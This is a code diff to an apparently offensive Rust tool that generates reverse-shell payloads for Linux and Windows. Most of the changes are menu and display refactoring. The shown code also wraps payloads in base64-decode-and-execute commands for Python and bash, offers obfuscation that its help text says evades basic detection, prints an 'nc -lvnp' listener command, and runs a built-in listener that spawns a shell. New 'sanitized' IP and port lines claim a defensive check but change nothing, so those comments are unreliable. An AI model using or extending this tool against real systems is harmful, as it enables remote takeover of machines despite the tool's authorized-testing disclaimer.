@@ -10,6 +10,8 @@ use std::{
     str::FromStr,
 };
 
+use base64::Engine;
+
 #[cfg(feature = "clipboard")]
 use clipboard::{ClipboardContext, ClipboardProvider};
 
@@ -52,14 +54,6 @@ enum OsType {
     Windows,
 }
 
-impl OsType {
-    fn key(self) -> &'static str {
-        match self {
-            OsType::Linux => "linux",
-            OsType::Windows => "windows",
-        }
-    }
-}
 
 impl fmt::Display for OsType {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
@@ -87,15 +81,20 @@ enum PayloadTemplate {
 
 impl PayloadTemplate {
     fn render(&self, config: &Config) -> String {
+        // Ensure the IP and port have been properly validated before rendering
+        // This is a defensive check
+        let sanitized_ip = &config.active_ip;
+        let sanitized_port = config.port.to_string();
+
         match self {
             PayloadTemplate::Static(template) => template
-                .replace("{ip}", &config.active_ip)
-                .replace("{port}", &config.port.to_string()),
+                .replace("{ip}", sanitized_ip)
+                .replace("{port}", &sanitized_port),
             PayloadTemplate::PythonBase64 { script } => {
                 let script = script
-                    .replace("{ip}", &config.active_ip)
-                    .replace("{port}", &config.port.to_string());
-                let encoded = base64::encode(script);
+                    .replace("{ip}", sanitized_ip)
+                    .replace("{port}", &sanitized_port);
+                let encoded = base64::engine::general_purpose::STANDARD.encode(script);
                 format!(
                     "python3 -c \"import base64,os,socket,pty; exec(base64.b64decode('{}').decode())\"",
                     encoded
@@ -109,7 +108,7 @@ impl PayloadTemplate {
         match obfuscation {
             ObfuscationType::None => basic_payload,
             ObfuscationType::Base64 => {
-                let encoded = base64::encode(&basic_payload);
+                let encoded = base64::engine::general_purpose::STANDARD.encode(&basic_payload);
                 format!("echo {} | base64 -d | bash", encoded)
             },
             ObfuscationType::BashHex => {
@@ -539,6 +538,7 @@ fn get_local_ip() -> String {
 
 fn get_public_ip() -> String {
     // Try to get public IP from multiple services
+    // Using fixed, known-safe URLs to prevent command injection
     let urls = [
         "https://api.ipify.org",
         "https://icanhazip.com",
@@ -547,6 +547,13 @@ fn get_public_ip() -> String {
     ];
 
     for url in &urls {
+        // Validate URL before using it (ensure it's a safe, expected format)
+        if !url.starts_with("https://") ||
+           !(url.contains("ipify.org") || url.contains("icanhazip.com") ||
+             url.contains("ident.me") || url.contains("ipecho.net")) {
+            continue; // Skip invalid URLs
+        }
+
         if let Ok(response) = std::process::Command::new("curl")
             .arg("-s")
             .arg("--max-time")
@@ -630,6 +637,11 @@ fn load_config() -> Option<Config> {
 }
 
 fn validate_ip(ip: &str) -> Result<(), String> {
+    // Additional validation to prevent shell metacharacters
+    if ip.contains(|c: char| !matches!(c, '0'..='9' | '.')) {
+        return Err("IP contains invalid characters".to_string());
+    }
+
     std::net::Ipv4Addr::from_str(ip)
         .map(|_| ())
         .map_err(|_| "Invalid IP address format".to_string())
@@ -795,7 +807,7 @@ async fn start_builtin_listener_async(port: u16) -> Result<(), Box<dyn std::erro
     println!("{}", format!("[+] Connection received from: {}", addr).green().bold());
 
     // Split the stream into read and write halves
-    let (mut reader, mut writer) = stream.into_split();
+    let (mut reader, writer) = stream.into_split();
 
     // Spawn shell process
     let mut child = tokio::process::Command::new(get_shell_command())
@@ -804,9 +816,9 @@ async fn start_builtin_listener_async(port: u16) -> Result<(), Box<dyn std::erro
         .stderr(std::process::Stdio::piped())
         .spawn()?;
 
-    let mut stdin = child.stdin.take().expect("Failed to get stdin");
-    let mut stdout = child.stdout.take().expect("Failed to get stdout");
-    let mut stderr = child.stderr.take().expect("Failed to get stderr");
+    let stdin = child.stdin.take().expect("Failed to get stdin");
+    let stdout = child.stdout.take().expect("Failed to get stdout");
+    let stderr = child.stderr.take().expect("Failed to get stderr");
 
     // Create a broadcast channel to send shell output to network
     let (shell_output_tx, mut shell_output_rx) = mpsc::unbounded_channel::<Vec<u8>>();
@@ -901,26 +913,12 @@ fn display_banner() {
 }
 
 fn display_config(config: &Config) {
-    println!("\n{}", format!("╔{}╗", "═".repeat(78)).blue().bold());
-    println!(
-        "{}  {}  {}",
-        "║".blue().bold(),
-        "CURRENT CONFIGURATION".green().bold(),
-        format!("{: <55}║", "").blue().bold()
-    );
-    println!("{}", format!("╠{}╣", "═".repeat(78)).blue().bold());
+    println!("\n{}", "┌─[ Configuration ]─────────────────────────────────────────────────────┐".blue());
+    println!("{}", format!("│ {: <75} │", "CURRENT CONFIGURATION".green().bold()).blue());
+    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());
 
     let format_line = |name: &str, value: &str, color: Color| {
-        let padding = 74i32 - name.len() as i32 - value.len() as i32;
-        let padding = padding.max(0) as usize;
-        let full_line = format!(
-            "{}  {}  {}{}",
-            "║".blue().bold(),
-            format!("{}:", name).cyan(),
-            value.color(color),
-            format!("{: <width$}║", "", width = padding).blue().bold()
-        );
-        println!("{}", full_line);
+        println!("{}", format!("│ {: <15} : {: <55} │", name.cyan().bold(), value.color(color)).blue());
     };
 
     format_line("Local IP", &config.local_ip, Color::Yellow);
@@ -936,33 +934,43 @@ fn display_config(config: &Config) {
     };
     format_line("Listener", listener_type_str, Color::Green);
 
-    println!("{}", format!("╚{}╝", "═".repeat(78)).blue().bold());
+    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
 }
 
 fn display_payloads(payloads: &[RenderedPayload], port: u16, obfuscation: ObfuscationType) {
-    println!("\n{}", "─".repeat(80).blue().bold());
-    for (idx, payload) in payloads.iter().enumerate() {
-        println!(
-            "\n{}{}{}{}",
-            format!("[{}] ", idx + 1).green().bold(),
-            payload.name.cyan().bold(),
-            format!(" ({})", payload.lang).blue(),
-            format!(" (OS: {})", payload.os).blue()
-        );
-        if obfuscation != ObfuscationType::None {
-            println!("{}", format!(" (OBFUSCATED: {:?})", obfuscation).magenta());
-        }
-        println!("{}", "─".repeat(80).blue());
-        println!("{}", format!("┌─[ Payload ]──────────────────────────────────────────────────────────┐").blue());
-        println!("{}", format!("│ {} │", format_payload(payload.payload.as_str(), 75)).yellow());
-        println!("{}", format!("└────────────────────────────────────────────────────────────────────┘").blue());
-        println!("{}", "─".repeat(80).blue());
+    if payloads.is_empty() {
+        println!("{}", "\n[i] No payloads found".yellow());
+        return;
     }
-    println!(
-        "\n{} {}",
-        "[*] Listener Command:".blue(),
-        format!("nc -lvnp {}", port).yellow().bold()
-    );
+
+    println!("\n{}", "┌─[ Payloads ]─────────────────────────────────────────────────────────┐".blue());
+    println!("{}", format!("│ {: <75} │", format!("Found {} payloads", payloads.len()).cyan()).blue());
+    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());
+
+    for (idx, payload) in payloads.iter().enumerate() {
+        println!("{}", format!("│ {: <75} │", "").blue());
+        let obfuscation_str = if obfuscation != ObfuscationType::None {
+            format!(" [OBFUSCATED: {:?}]", obfuscation).magenta().to_string()
+        } else {
+            "".to_string()
+        };
+        println!("{}", format!("│ {}. {: <20} [{}] [OS: {}] {}",
+            (idx + 1).to_string().green().bold(),
+            payload.name.cyan().bold(),
+            payload.lang.blue(),
+            payload.os.to_string().blue(),
+            obfuscation_str).blue());
+        println!("{}", format!("│ {: <75} │", "").blue());
+
+        let formatted_payload = format_payload(&payload.payload, 73);
+        println!("{}", format!("│   Payload: {: <66} │", formatted_payload.yellow()).blue());
+        println!("{}", format!("│ {: <75} │", "").blue());
+    }
+    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
+
+    println!("\n{}", format!("┌─[ Listener Command ]─────────────────────────────────────────────────┐").blue());
+    println!("{}", format!("│ {: <75} │", format!("nc -lvnp {}", port).yellow().bold()).blue());
+    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
 
     if !payloads.is_empty() {
         println!("{}", "\n[*] Would you like to copy a payload to clipboard? (y/n): ".blue());
@@ -989,6 +997,81 @@ fn format_payload(payload: &str, max_width: usize) -> String {
         return payload.to_string();
     }
     format!("{}...", &payload[0..max_width-3])
+}
+
+fn display_help() {
+    clear_screen();
+    display_fancy_banner();
+
+    println!("\n{}", "┌─[ Help & Usage ]─────────────────────────────────────────────────────┐".blue());
+    println!("{}", format!("│ {: <75} │", "HELP & USAGE GUIDE".green().bold()).blue());
+    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());
+    println!("{}", format!("│ {: <75} │", "").blue());
+    println!("{}", format!("│ {: <75} │", "MAIN COMMANDS:".cyan().bold()).blue());
+    println!("{}", format!("│ {: <75} │", "  1. Generate Linux Shells - Create reverse shells for Linux systems".blue()));
+    println!("{}", format!("│ {: <75} │", "  2. Generate Windows Shells - Create reverse shells for Windows systems".blue()));
+    println!("{}", format!("│ {: <75} │", "  3. Reconfigure IP/Port - Change your IP address or port settings".blue()));
+    println!("{}", format!("│ {: <75} │", "  4. Start Listener - Start a listener to catch reverse shells".blue()));
+    println!("{}", format!("│ {: <75} │", "  5. Configure Listener Type - Choose between built-in or netcat listener".blue()));
+    println!("{}", format!("│ {: <75} │", "  6. Save Current Config - Save your current settings for later".blue()));
+    println!("{}", format!("│ {: <75} │", "  7. Load Config - Load previously saved settings".blue()));
+    println!("{}", format!("│ {: <75} │", "  8. Exit - Exit the application".blue()));
+    println!("{}", format!("│ {: <75} │", "").blue());
+    println!("{}", format!("│ {: <75} │", "PAYLOAD OPTIONS:".cyan().bold()).blue());
+    println!("{}", format!("│ {: <75} │", "  - Each payload can be generated for different languages (bash, python, etc.)".blue()));
+    println!("{}", format!("│ {: <75} │", "  - Obfuscation options help evade basic detection".blue()));
+    println!("{}", format!("│ {: <75} │", "  - Use the clipboard feature to copy payloads directly".blue()));
+    println!("{}", format!("│ {: <75} │", "").blue());
+    println!("{}", format!("│ {: <75} │", "LEGAL:".cyan().bold()).blue());
+    println!("{}", format!("│ {: <75} │", "  This tool is for authorized penetration testing and CTFs ONLY.".blue()));
+    println!("{}", format!("│ {: <75} │", "  Use responsibly and within legal boundaries.".blue()));
+    println!("{}", format!("│ {: <75} │", "").blue());
+    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
+
+    let _ = get_input("\nPress Enter to return to main menu...");
+}
+
+fn search_payloads(all_shells: &[ShellPayload], config: &Config) {
+    clear_screen();
+    display_fancy_banner();
+    display_config(config);
+
+    println!("\n{}", "┌─[ Search Payloads ]──────────────────────────────────────────────────┐".blue());
+    println!("{}", format!("│ {: <75} │", "SEARCH PAYLOADS".green().bold()).blue());
+    println!("{}", "├─────────────────────────────────────────────────────────────────────┤".blue());
+
+    let search_term = get_input("Enter search term (name, language, or OS): ");
+
+    if search_term.is_empty() {
+        println!("{}", "[!] Empty search term. Returning to menu...".red());
+        let _ = get_input("Press Enter to continue...");
+        return;
+    }
+
+    let filtered_payloads: Vec<RenderedPayload> = all_shells
+        .iter()
+        .filter(|payload| {
+            payload.name.to_lowercase().contains(&search_term.to_lowercase()) ||
+            payload.lang.to_lowercase().contains(&search_term.to_lowercase()) ||
+            format!("{:?}", payload.os).to_lowercase().contains(&search_term.to_lowercase())
+        })
+        .map(|payload| RenderedPayload {
+            name: payload.name,
+            lang: payload.lang,
+            os: payload.os,
+            payload: payload.template.render(config),
+        })
+        .collect();
+
+    println!("{}", format!("│ {: <75} │", format!("Found {} payloads matching '{}'", filtered_payloads.len(), search_term).yellow().bold()).blue());
+    println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
+
+    if !filtered_payloads.is_empty() {
+        display_payloads(&filtered_payloads, config.port, ObfuscationType::None);
+    } else {
+        println!("{}", "[i] No payloads found matching your search".yellow());
+        let _ = get_input("\nPress Enter to continue...");
+    }
 }
 
 fn select_listener_type(config: &mut Config) {
@@ -1224,6 +1307,7 @@ fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload])
         println!("  {} {}", "[3]".green().bold(), "Show All Available Shells".cyan());
         println!("  {} {}", "[4]".green().bold(), "Generate Shells & Start Listener".cyan());
         println!("  {} {}", "[5]".green().bold(), "Generate Obfuscated Shells (Top 5)".cyan());
+        println!("  {} {}", "[6]".green().bold(), "Search Payloads".cyan());
         println!("{}", "└────────────────────────────────────────────────────────────────────┘".blue());
 
         println!("{}", format!("┌─[ Quick Access Languages ]───────────────────────────────────────────┐").magenta());
@@ -1236,13 +1320,13 @@ fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload])
             println!(
                 "  {} {} menu",
                 format!("[{}]", key).green().bold(),
-                lang.capitalize().yellow()
+                capitalize_string(lang).yellow()
             );
         }
         println!("{}", format!("└────────────────────────────────────────────────────────────────────┘").magenta());
 
         println!("{}", format!("┌─[ Navigation ]───────────────────────────────────────────────────────┐").blue());
-        println!("  {} {}", "[6]".green().bold(), "Back to Main Menu".yellow());
+        println!("  {} {}", "[7]".green().bold(), "Back to Main Menu".yellow());
         println!("{}", "└────────────────────────────────────────────────────────────────────┘".blue());
 
         let choice = get_input("Select option: ");
@@ -1279,7 +1363,7 @@ fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload])
                     println!(
                         "  {} {}",
                         format!("[{}]", idx + 1).green(),
-                        lang.capitalize()
+                        capitalize_string(lang)
                     );
                 }
                 println!("{}", "─".repeat(80).bold());
@@ -1323,7 +1407,10 @@ fn os_submenu(config: &mut Config, os_type: OsType, all_shells: &[ShellPayload])
                 display_payloads(&payloads, config.port, obfuscation);
                 let _ = get_input("\nPress Enter to continue...");
             }
-            "6" => break,
+            "6" => {
+                search_payloads(all_shells, config);
+            }
+            "7" => break,
             _ if choice.len() == 1 => {
                 if let Some((_, lang)) = quick_access.iter().find(|(key, _)| key == &choice) {
                     language_submenu(config, os_type, lang, all_shells);
@@ -1372,22 +1459,22 @@ fn language_submenu(
         println!(
             "  {} Show All {} Shells",
             "[1]".green(),
-            language.capitalize()
+            capitalize_string(language)
         );
         println!(
             "  {} Show Top 5 {} Shells",
             "[2]".green(),
-            language.capitalize()
+            capitalize_string(language)
         );
         println!(
             "  {} Show All {} Shells (Obfuscated)",
             "[3]".green(),
-            language.capitalize()
+            capitalize_string(language)
         );
         println!(
             "  {} Show Top 5 {} Shells (Obfuscated)",
             "[4]".green(),
-            language.capitalize()
+            capitalize_string(language)
         );
         println!("  {} Generate & Start Listener", "[5]".green());
         println!("  {} Back to {} Menu", "[6]".green(), os_type.to_string());
@@ -1521,16 +1608,19 @@ fn main_loop() -> Result<(), io::Error> {
                 .bold()
         );
 
-        println!("\n{}", "┌─[ Main Menu ]──────────────────────────────────────────────────────────┐".blue());
-        println!("  {} {}", "[1]".green().bold(), "Generate Linux Shells".cyan());
-        println!("  {} {}", "[2]".green().bold(), "Generate Windows Shells".cyan());
-        println!("  {} {}", "[3]".green().bold(), "Reconfigure IP/Port".cyan());
-        println!("  {} {}", "[4]".green().bold(), "Start Listener".cyan());
-        println!("  {} {}", "[5]".green().bold(), "Configure Listener Type".cyan());
-        println!("  {} {}", "[6]".green().bold(), "Save Current Config".cyan());
-        println!("  {} {}", "[7]".green().bold(), "Load Config".cyan());
-        println!("  {} {}", "[8]".green().bold(), "Exit".cyan());
-        println!("{}", "└────────────────────────────────────────────────────────────────────────┘".blue());
+        println!("\n{}", "┌─[ Main Menu ]─────────────────────────────────────────────────────────┐".blue());
+        println!("{}", format!("│ {: <75} │", "").blue());
+        println!("{}", format!("│ {: <75} │", "1. Generate Linux Shells".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "2. Generate Windows Shells".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "3. Reconfigure IP/Port".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "4. Start Listener".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "5. Configure Listener Type".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "6. Save Current Config".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "7. Load Config".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "8. Help".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "9. Exit".cyan()).blue());
+        println!("{}", format!("│ {: <75} │", "").blue());
+        println!("{}", "└─────────────────────────────────────────────────────────────────────┘".blue());
         display_main_menu_help();
 
         let choice = get_input("Select option: ");
@@ -1567,6 +1657,9 @@ fn main_loop() -> Result<(), io::Error> {
                 let _ = get_input("\nPress Enter to continue...");
             }
             "8" => {
+                display_help();
+            }
+            "9" => {
                 println!("{}", "\n[*] Exiting... Stay safe and legal!".green());
                 break;
             }
@@ -1580,17 +1673,12 @@ fn main_loop() -> Result<(), io::Error> {
     Ok(())
 }
 
-trait Capitalize {
-    fn capitalize(&self) -> String;
-}
 
-impl Capitalize for str {
-    fn capitalize(&self) -> String {
-        let mut chars = self.chars();
-        match chars.next() {
-            None => String::new(),
-            Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
-        }
+fn capitalize_string(s: &str) -> String {
+    let mut chars = s.chars();
+    match chars.next() {
+        None => String::new(),
+        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
     }
 }
 
